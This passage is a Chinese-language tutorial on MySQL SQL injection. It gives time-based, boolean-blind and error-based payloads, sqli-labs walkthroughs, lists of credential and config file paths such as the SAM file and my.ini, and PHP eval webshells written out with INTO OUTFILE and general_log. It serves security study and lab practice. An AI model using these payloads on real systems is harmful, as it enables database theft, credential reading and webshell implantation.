class="language-none">select count(*) from information_schema.columns A;1 row in set (1.47 sec)</code></pre><p><strong>get_lock</strong></p><pre class="language-none"><code class="language-none">SELECT GET_LOCK(key, timeout) FROM DUAL;SELECT RELEASE_LOCK(key) FROM DUAL;</code></pre><p>其中GET_LOCK()和RELEASE_LOCK()分别是两个函数，并且有参数和返回值，这里的DUAL是伪表，在Oracle中很常见，就是一个不存在的表，用来临时记录值的。</p><ul><li>GET_LOCK有两个参数，一个是key，就是根据这个参数进行加锁的，另一个是等待时间(s)，即获取锁失败后等待多久回滚事务。</li><li>这里假设连接A先GET_LOCK(“lock_test”, 10)，因为lock_test这个字段在之前没有加锁所以不需要等待，直接返回1，加锁成功。 然后连接B再GET_LOCK(“lock_test”, 10)，等待10s，若这期间没有释放这个字段的锁，则10s过后返回0，连接B加锁失败。 这里的问题就是这个加锁方式很危险，一旦加锁之后忘记释放，就会一直锁住这个字段，除非连接断开。尤其是第二个参数，千万不要理解成超时时间，并不是设置一个字段的锁，然后超过这个时间就自动释放了，这个是等待时间，即第二次对同一个字段加锁，等待多久然后返回。</li><li>这个RELEASE_LOCK就没什么好说的了，记得加锁之后释放就可以了，成功释放回返回1。</li></ul><p>在一个连接session中可以先锁定一个变量，例如：<code>select get_lock('aaa',1);</code></p><p>然后再通过另一个连接session，再次执行get_lock函数：<code>select get_lock('aaa',2);</code>，此时将产生2秒的延时。</p><pre class="language-none"><code class="language-none">//第一个连接mysql&gt; select get_lock('aaa',1);+-------------------+| get_lock('aaa',1) |+-------------------+|                 1 |+-------------------+1 row in set (0.00 sec)//打开另一个cmd  再次连接mysql，执行get_lock，发现延时mysql&gt; select get_lock('aaa',1);+-------------------+| get_lock('aaa',1) |+-------------------+|                 0 |+-------------------+1 row in set (1.00 sec)</code></pre><p>利用场景是有条件限制的：需要提供长连接。在<code>Apache+PHP</code>搭建的环境中需要使用<code>mysql_pconnect(打开一个到 MySQL 服务器的持久连接)</code>函数来连接数据库。在CTF中，只有出题人很刻意的使用这个函数，才暗示使用这个</p><p><strong>正则表达式</strong></p><p>正则匹配在匹配较长字符串单自由度比较高的字符串时，会有大量的回溯，造成较大的计算量</p><pre class="language-none"><code class="language-none">select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');mysql&gt; select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');+-------------------------------------------------------------+| rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b') |+-------------------------------------------------------------+|                                                           0 |+-------------------------------------------------------------+1 row in set (2.94 sec)</code></pre><h3 id="基于报错的SQL-盲注"><a href="#基于报错的SQL-盲注" class="headerlink" title="基于报错的SQL 盲注"></a>基于报错的SQL 盲注</h3><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数</p><p>报错注入就是利用了数据库的某些机制，认为的制造错误条件，使得查询结果能够 出现在错误信息中。</p><p>构造payload 让信息通过错误提示回显出来</p><pre class="language-none"><code class="language-none">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;</code></pre><p>参考：<a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p><p><strong>floor()</strong></p><blockquote><p>floor(x)</p><p>返回小于或等于 x 的最大整数　　</p></blockquote><pre class="language-none"><code class="language-none">SELECT FLOOR(1.5) -- 返回1</code></pre><pre class="language-none"><code class="language-none">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;</code></pre><p>以上语句可以简化成如下的形式。</p><pre class="language-none"><code class="language-none">select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))</code></pre><p>如果关键的表被禁用了，可以使用这种形式</p><pre class="language-none"><code class="language-none">select count(*) from (select 1 union select null unionselect !1) group by concat(version(),floor(rand(0)*2))</code></pre><p>如果rand 被禁用了可以使用用户变量来报错</p><pre class="language-none"><code class="language-none">select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</code></pre><pre class="language-none"><code class="language-none">爆库select 1 from ( select count(*),(concat((select schema_name from information_schema.schemata limit0,1),’|’,floor(rand(0)*2)))x from information_schema.tables group by x )a;http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinctconcat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)爆表select 1 from (select count(*),(concat((select table_name from information_schema.tables wheretable_schema=database() limit 0,1),’|’,floor(rand(0)*2)))x from information_schema.tables group by x)a;爆字段select 1 from (select count(*),(concat((select column_name from information_schema.columns wheretable_schema=database() and table_name=‘users’ limit 0,1),’|’,floor(rand(0)*2)))x from information_schema.tablesgroup by x)a;爆数据select 1 from (select count(*),(concat((select concat(name,’|’,passwd,’|’,birth) from users limit0,1),’|’,floor(rand(0)*2)))x from information_schema.tables group by x)a;select 1 from(select count(*),concat((select (select (SELECT concat(0x23,name,0x3a,passwd,0x23) FROM users limit0,1)) from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a</code></pre><p><strong>几何函数</strong></p><pre class="language-none"><code class="language-none">GeometryCollection：id=1 AND GeometryCollection((select * from (select* from(select user())a)b))polygon()：id=1 AND polygon((select * from(select * from(select user())a)b))multipoint()：id=1 AND multipoint((select * from(select * from(select user())a)b))multilinestring()：id=1 AND multilinestring((select * from(select * from(select user())a)b))linestring()：id=1 AND LINESTRING((select * from(select * from(select user())a)b))multipolygon() ：id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></pre><p><strong>不存在函数</strong></p><pre class="language-none"><code class="language-none">可以用来爆数据库select a();ERROR 1305 (42000): FUNCTION mysql.a does not exist</code></pre><p><strong>name_const()</strong></p><pre class="language-none"><code class="language-none">仅可取数据库版本信息select * from(select name_const(version(),0x1),name_const(version(),0x1))a;ERROR 1060 (42S21): Duplicate column name '5.5.29'</code></pre><p><strong>uuid相关函数</strong></p><pre class="language-none"><code class="language-none">适用版本：8.0.xmysql&gt; SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</code></pre><p><strong>exp()</strong></p><blockquote><p>exp(int)</p><p>返回e的x次方</p><p>适用版本：版本在5.5.5~5.5.49</p></blockquote><pre class="language-none"><code class="language-none">select exp(~(select * FROM(SELECT USER())a));--其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函 数内，得到的结果将超过mysql的double数组范围，从而报错输出。除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。--double 数值类型超出范围--Exp()为以e 为底的对数函数；--ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'如果是在适用版本之外：虽然也会报错，但是表名不会出来select !(select * from(select user())a)-~0;</code></pre><p><strong>exp、cot、pow、abs等可以报错</strong></p><pre class="language-none"><code class="language-none">select abs(99999e9999999); #可使用在报错的布尔盲注中ERROR 1367 (22007): Illegal double '99999e9999999' value found during parsingselect pow(1+(1=1),999999999999);mysql&gt; select pow(1+(1=1),999999999999);ERROR 1690 (22003): DOUBLE value is out of range in 'pow((1 + (1 = 1)),999999999999)'mysql&gt; select pow(1+(1=0),999999999999);+---------------------------+| pow(1+(1=0),999999999999) |+---------------------------+|                         1 |+---------------------------+1 row in set (0.00 sec)通过这种写法，可以实现报错注入select pow(1+(表达式),999999999999)表达式可以是盲注的形式，返回1或者0，通过报错将字符才出来其他函数用法类似exp临界值709exp(709+(1=0))</code></pre><p>可以参考exp 报错文章：<a href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p><pre class="language-none"><code class="language-none">select !(select * from (select user())x) -（ps:这是减号） ~0--bigint 超出范围；~0 是对0 逐位取反，很大的版本在5.5.5 及其以上</code></pre><p>可以参考文章bigint 溢出文章<a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p><pre class="language-none"><code class="language-none">extractvalue(1,concat(0x7e,(select @@version),0x7e)) --mysql 对xml 数据进行查询和修改的xpath 函数，xpath 语法错误</code></pre><pre class="language-none"><code class="language-none">updatexml(1,concat(0x7e,(select @@version),0x7e),1) --mysql 对xml 数据进行查询和修改的xpath 函数，xpath 语法错误</code></pre><pre class="language-none"><code class="language-none">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;--mysql 重复特性，此处重复了version，所以报错。</code></pre><p><strong>join using()注列名</strong></p><p>通过系统关键词join可建立两个表之间的内连接。</p><p>通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。</p><p>并且报错信息会存在重复的列名，可以使用USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p><pre class="language-none"><code class="language-none">mysql&gt;select * from(select * from users a join (select * from users)b)c;mysql&gt;select * from(select * from users a join (select * from users)b using(username))c;mysql&gt;select * from(select * from users a join (select * from users)busing(username,password))c</code></pre><p><strong>GTID相关函数</strong></p><p>从MySQL 5.6.5 开始新增了一种基于GTID 的复制方式。通过GTID 保证了每个在主库上提交的事务在集群中有一个唯一的ID。这种方式强化了数据库的主备一致性，故障恢复以及容错能力。</p><p>GTID (Global Transaction ID)是全局事务ID,当在主库上提交事务或者被从库应用时，可以定位和追踪每一个事务，对DBA来说意义就很大了，我们可以适当的解放出来，不用手工去可以找偏移量的值了，而是通过CHANGE MASTER TO MASTER_HOST=’xxx’, MASTER_AUTO_POSITION=1的即可方便的搭建从库，在故障修复中也可以采用MASTER_AUTO_POSITION=‘X’的方式。</p><p>可能大多数人第一次听到GTID的时候会感觉有些突兀，但是从架构设计的角度，GTID是一种很好的分布式ID实践方式，通常来说，分布式ID有两个基本要求： 1）全局唯一性 2）趋势递增 这个ID因为是全局唯一，所以在分布式环境中很容易识别，因为趋势递增，所以ID是具有相应的趋势规律，在必要的时候方便进行顺序提取，行业内适用较多的是基于Twitter的ID生成算法snowflake,所以换一个角度来理解GTID，其实是一种优雅的分布式设计。</p><pre class="language-none"><code class="language-none">mysql&gt;select gtid_subset(user(),1);mysql&gt;select gtid_subset(hex(substr((select * from users limit1,1),1,1)),1);mysql&gt;select gtid_subtract((select * from(select user())a),1);</code></pre><p><strong>报错函数速查表</strong></p><p><strong>sqli-labs/less-5</strong></p><p><strong>一：盲注</strong></p><pre class="language-none"><code class="language-none">（1）利用left(database(),3)进行尝试http://127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),3)=5.7--+    接下来看一下数据库的长度http://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+    猜测数据库第一位http://127.0.0.1/sqllib/Less-5/?id=1'and left(database(),1)&gt;'a'--+    用此方法推测出其他几位（2）利用substr() ascii()函数进行尝试/left也可以，都行http://127.0.0.1/sqli-labs/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;65 --+    用此方法推测出其他几位，得到第一个表名    接下来用limit 1,1得到第二个表名，以此类推（3）利用regexp 获取表中的列http://127.0.0.1/sqli-labs/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+    用此方法推测出其他几位，得到列名（4）利用ord()和mid()函数获取users 表的内容http://127.0.0.1/sqli-labs/Less-5/?id=1' and ord(mid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+    解释：    IFNULL(v1,v2):如果 v1 的值不为 NULL，则返回 v1，否则返回 v2。    CAST(x AS type)：转换数据类型    SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1    所以这句就是先从表users将username字段取出通过order by进行升序，取出第一行的数据，再cast将其转化为字    符类型，在通过IFNULL判断其里面的数据是否为空，不为空则返回其数据。以上（1）（2）（3）（4）我们通过使用不同的语句，通过布尔盲注SQL把所有的payload 进行演示了一次。想必通过实例更能够对sql 布尔盲注语句熟悉和理解了</code></pre><p><strong>二：报错注入</strong></p><pre class="language-none"><code class="language-none">（1）首先使用报错注入，利用count、floor、group by进行报错http://127.0.0.1/sqli-labs/Less-5/?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a--+（2）利用double 数值类型超出范围进行报错注入http://127.0.0.1/sqli-labs/Less-5/?id=-1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+（3）利用bigint 溢出进行报错注入.http://127.0.0.1/sqli-labs/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+（4）xpath 函数报错注入http://127.0.0.1/sqli-labs/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+（5）updatexml 函数报错注入http://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+（6）利用数据的重复性http://127.0.0.1/sqli-labs/Less-5/?id=1'union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</code></pre><p><strong>updatexml()函数</strong></p><ul><li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li><li>作用：改变文档中符合条件的节点的值</li><li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li><li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li><li>适用版本: 5.1.5+</li></ul><pre class="language-none"><code class="language-none">select updatexml(1,concat(0x7e,(select user()),0x7e),1)ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'</code></pre><p><strong>extractvalue()函数</strong></p><ul><li>此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li><li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</li><li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li></ul><pre class="language-none"><code class="language-none">select extractvalue(1,concat(0x7e,(select user()),0x7e))ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'</code></pre><p><strong>三：延时注入</strong></p><pre class="language-none"><code class="language-none">（1）利用sleep()函数进行注入，当错误的时候会有5 秒的时间延时。http://127.0.0.1/sqli-labs/Less-5/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+（2）利用BENCHMARK()进行延时注入http://127.0.0.1/sqli-labs/Less-5/?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+当结果正确的时候，运行ENCODE('MSG','by 5 seconds')操作50000000 次，会占用一段时间。</code></pre><p>sqli-labs/Less-9的payload</p><pre class="language-none"><code class="language-none">--猜测数据库：http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+--说明第一位是s （ascii 码是115）http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr(database(),2,1))=101,1,sleep(5))--+说明第一位是e （ascii 码是101）....以此类推，我们知道了数据库名字是security猜测security 的数据表：http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+猜测第一个数据表的第一位是e,...依次类推，得到emailshttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5))--+猜测第二个数据表的第一位是r,...依次类推，得到referers...再以此类推，我们可以得到所有的数据表emails,referers,uagents,users猜测users 表的列：http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+猜测users 表的第一个列的第一个字符是i，以此类推，我们得到列名是id，username，password猜测username 的值：http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+猜测username 的第一行的第一位以此类推，我们得到数据库username，password 的所有内容以上的过程就是我们利用sleep()函数注入的整个过程，当然了可以离开BENCHMARK()函数进行注入</code></pre><h2 id="导入导出相关操作的讲解"><a href="#导入导出相关操作的讲解" class="headerlink" title="导入导出相关操作的讲解"></a>导入导出相关操作的讲解</h2><p>在了解导入导出相关操作时，先了解以下<code>Mysql</code>变量</p><h3 id="mysql变量"><a href="#mysql变量" class="headerlink" title="mysql变量"></a>mysql变量</h3><p>mysqld服务器维护两种变量。全局变量影响服务器的全局操作。会话变量影响具体客户端连接相关操作。</p><p>服务器启动时，将所有全局变量初始化为默认值。可以在选项文件或命令行中指定的选项来更改这些默认值。服务器启动后，通过连接服务器并执行<code>SET GLOBAL var_name</code>语句可以更改动态全局变量。要想更改全局变量，必须具有SUPER权限。</p><p>服务器还为每个客户端连接维护会话变量。连接时使用相应全局变量的当前值对客户端会话变量进行初始化。客户可以通过<code>SET SESSION var_name</code>语句来更改动态会话变量。设置会话变量不需要特殊权限，但客户可以只更改自己的会话变量，而不更改其它客户的会话变量。</p><p>可以通过<code>SHOW VARIABLES</code>语句查看系统变量及其值。</p><pre class="language-none"><code class="language-none">mysql&gt; SHOW VARIABLES;</code></pre><p>可以使用like语句来匹配和筛选。</p><p><strong>secure_file_priv</strong></p><blockquote><p><code>secure_file_priv</code>对读写文件有影响。 <code>secure-file-priv</code>参数是用来限制<code>LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()</code>传到哪个指定目录的。 当<code>secure_file_priv</code>的值为<code>null</code> ，表示限制<code>mysqld</code> 不允许导入|导出。默认是<code>null</code> 当<code>secure_file_priv</code>的值为<code>/tmp/</code> ，表示限制<code>mysqld</code> 的导入|导出只能发生在<code>/tmp/</code>目录 下 当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>mysqld</code> 的导入|导出做限制</p></blockquote><h3 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h3><p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p><blockquote><p><strong>使用条件：</strong> A、必须有权限读取并且文件必须完全可读</p><p>and (select count() from mysql.user)&gt;0 /* 如果结果返回正常,说明具有读写权限。</p><p>and (select count() from mysql.user)&gt;0 /* 返回错误，应该是管理员给数据库帐户降权</p><p>B、欲读取文件必须在服务器上</p><p>C、必须指定文件完整的路径</p><p>D、欲读取文件必须小于max_allowed_packet 如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在windows 下，如果NTFS 设置得当，是不能读取相关的文件的，当遇到只有administrators 才能访问的文件，users 就别想load_file 出来。</p><p>在实际的注入中，我们有两个难点需要解决：</p><p>绝对物理路径 构造有效的畸形语句（报错爆出绝对路径）</p><p>在很多PHP 程序中，当提交一个错误的Query，如果display_errors = on，程序就会暴露WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP 程序来说，整个服务器的安全将受到严重的威胁。</p></blockquote><h3 id="WINDOWS下"><a href="#WINDOWS下" class="headerlink" title="WINDOWS下:"></a>WINDOWS下:</h3><blockquote><p>c:/boot.ini //查看系统版本</p><p>c:/windows/php.ini //php配置信息</p><p>c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</p><p>c:/winnt/php.ini</p><p>c:/winnt/my.ini</p><p>c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码</p><p>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码</p><p>c:\Program Files\Serv-U\ServUDaemon.ini</p><p>c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</p><p>c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码</p><p>c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此</p><p>c:\Program Files\RhinoSoft.com\ServUDaemon.exe</p><p>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere*.cif文件</p><p>//存储了pcAnywhere的登陆密码</p><p>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件</p><p>c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.</p><p>c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机</p><p>d:\APACHE\Apache2\conf\httpd.conf</p><p>C:\Program Files\mysql\my.ini</p><p>C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</p></blockquote><h3 id="LUNIX-UNIX-下"><a href="#LUNIX-UNIX-下" class="headerlink" title="LUNIX/UNIX 下:"></a>LUNIX/UNIX 下:</h3><blockquote><p>/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</p><p>/usr/local/apache2/conf/httpd.conf</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p><p>/usr/local/app/php5/lib/php.ini //PHP相关设置</p><p>/etc/sysconfig/iptables //从中得到防火墙规则策略</p><p>/etc/httpd/conf/httpd.conf // apache配置文件</p><p>/etc/rsyncd.conf //同步程序配置文件</p><p>/etc/my.cnf //mysql的配置文件</p><p>/etc/redhat-release //系统版本</p><p>/etc/issue</p><p>/etc/issue.net</p><p>/usr/local/app/php5/lib/php.ini //PHP相关设置</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p><p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf //查看linux APACHE虚拟主机配置文件</p><p>/usr/local/resin-3.0.22/conf/resin.conf //针对3.0.22的RESIN配置文件查看</p><p>/usr/local/resin-pro-3.0.22/conf/resin.conf //同上</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</p><p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件</p><p>/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p><p>/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</p><p>/etc/sysconfig/iptables 查看防火墙策略</p><p>load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录</p><p>replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</p><p>replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p></blockquote><p><strong>示例：</strong></p><pre class="language-none"><code class="language-none">Select load_file(‘/flag’);SELECT CONVERT(LOAD_FILE("/etc/passwd") USING utf8);</code></pre><pre class="language-none"><code class="language-none">Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))利用hex()将文件内容导出来，尤其是smb文件时可以使用。-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的ASCII 代码-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)Explain：“c:/boot.ini”的16 进制是“0x633a2f626f6f742e696e69”-1 union select 1,1,1,load_file(c:\\boot.ini)Explain:路径里的/用\\代替</code></pre><h3 id="文件导入到数据库-LOAD-DATA-INFILE"><a href="#文件导入到数据库-LOAD-DATA-INFILE" class="headerlink" title="文件导入到数据库(LOAD DATA INFILE)"></a>文件导入到数据库(LOAD DATA INFILE)</h3><p>LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。</p><p>在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile 导入到数据库中。</p><p><strong>示例：</strong></p><pre class="language-none"><code class="language-none">load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t' lines terminated by '\n'</code></pre><p>将/tmp/t0.txt 导入到t0 表中，character set gbk 是字符集设置为gbk，fields terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符。</p><p>当错误代码是2 的时候的时候，文件不存在，错误代码为13 的时候是没有权限，可以考虑/tmp 等文件夹。 TIPS：我们从mysql5.7 的文档看到添加了load xml 函数，是否依旧能够用来做注入还需要验证。</p><h3 id="导入到文件-OUTFILE"><a href="#导入到文件-OUTFILE" class="headerlink" title="导入到文件(OUTFILE)"></a>导入到文件(OUTFILE)</h3><p>SELECT…..INTO OUTFILE ‘file_name’</p><p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name 不能是一个已经存在的文件。</p><blockquote><p>mysql中的配置文件secure_file_priv变量如果为NULL，则不能导入</p><p>[mysqld] secure_file_priv=”/“</p></blockquote><p>我们一般有两种利用形式： <strong>第一种直接将select 内容导入到文件中：</strong></p><pre class="language-none"><code class="language-none">Select version() into outfile “c:\\phpnow\\htdocs\\test.php”</code></pre><p>此处将<code>version()</code>替换成一句话，<code>\&lt;?php @eval($_post[“mima”])?&gt;</code></p><p>也即 <code>Select\&lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php”</code> 直接连接一句话就可以了，其实在select 内容中不仅仅是可以上传一句话的，也可以上传很多的内容。</p><p><strong>第二种修改文件结尾：</strong></p><pre class="language-none"><code class="language-none">Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16 进制文件</code></pre><p>解释：通常是用<code>‘\r\n’</code>结尾，此处我们修改为自己想要的任何文件。同时可以用<code>FIELDS TERMINATED BY 16</code> 进制可以为一句话或者其他任何的代码，可自行构造。在<code>sqlmap</code> 中<code>os-shell</code> 采取的就是 这样的方式，具体可参考<code>os-shell</code> 分析文章：<a href="http://www.cnblogs.com/lcamry/p/5505110.html">http://www.cnblogs.com/lcamry/p/5505110.html</a> TIPS： （1）可能在文件路径当中要注意转义，这个要看具体的环境 （2）上述我们提到了<code>load_file()</code>,但是当前台无法导出数据的时候，我们可以利用下面的语句：</p><pre class="language-none"><code class="language-none">select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’) into outfile‘c:\\wamp\\www\\test.php’</code></pre><p>可以利用该语句将服务器当中的内容导入到web 服务器下的目录，这样就可以得到数据了。上述my.ini 当中存在password 项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。</p><p>类似的还有一个<code>dumpfile</code></p><pre class="language-none"><code class="language-none">select "&lt;?php phpinfo();?&gt;" into dumpfile "/tmp/1.php";outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式</code></pre><p>当<code>secure_file_priv</code>为<code>NULL</code>时</p><pre class="language-none"><code class="language-none">如果存在堆叠注入，当然由于是global变量，需要root权限set global general_log=on;set global general_log_file='C:/phpStudy/WWW/789.php';select '&lt;?php eval($_POST['a']) ?&gt;';</code></pre><p><strong>sqli-labs/Less-7</strong></p><pre class="language-none"><code class="language-none">--使用')) or 1=1--+进行注入http://127.0.0.1/sqli-labs/Less-7/?id=1')) or 1=1 --+（2）利用上述提到的文件导入的方式进行演示：http://127.0.0.1/sqli-labs/Less-7/?id=-1')) union select 1,2,3 into outfile "D:/phpstudy_pro/WWW/sqli-labs/outfile/less-7.txt"--+（3）直接将一句话木马导入进去，再用菜刀等webshell 管理工具连接即可http://127.0.0.1/sqli-labs/Less-7/?id=-1'))UNION SELECT 1,2,'&lt;?php @eval($_post[“mima”])?&gt;' into outfile "D:/phpstudy_pro/WWW/sqli-labs/outfile/less-7.php"--+（4）这里也可以到处数据库的内容</code></pre><h2 id="增删改函数介绍"><a href="#增删改函数介绍" class="headerlink" title="增删改函数介绍"></a>增删改函数介绍</h2><p>在对数据进行处理上，我们经常用到的是增删查改。接下来我们讲解一下mysql 的增删改。查就是我们上述总用到的select，这里就介绍了。</p><p>增加一行数据。</p><p><strong>Insert</strong></p><p><strong>删除</strong></p><blockquote><p>删除数据: delete from 表名; delete from 表名where id=1; 删除结构： 删数据库：drop database 数据库名; 删除表：drop table 表名; 删除表中的列:alter table 表名drop column 列名;</p><p><strong>修改</strong> 修改所有：updata 表名set 列名=’新的值，非数字加单引号’ ; 带条件的修改：updata 表名set 列名=’新的值，非数字加单引号’ where id=6;</p></blockquote><h2 id="HTTP-头部介绍"><a href="#HTTP-头部介绍" class="headerlink" title="HTTP 头部介绍"></a>HTTP 头部介绍</h2><p>在利用抓包工具进行抓包的时候，我们能看到很多的项，下面详细讲解每一项。 HTTP 头部详解 1、Accept：告诉WEB 服务器自己接受什么介质类型，*/* 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。 2、Accept-Charset： 浏览器申明自己接收的字符集</p><p>Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate） Accept-Language：：浏览器申明自己接收的语言语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk 等等。 3、Accept-Ranges：WEB 服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。 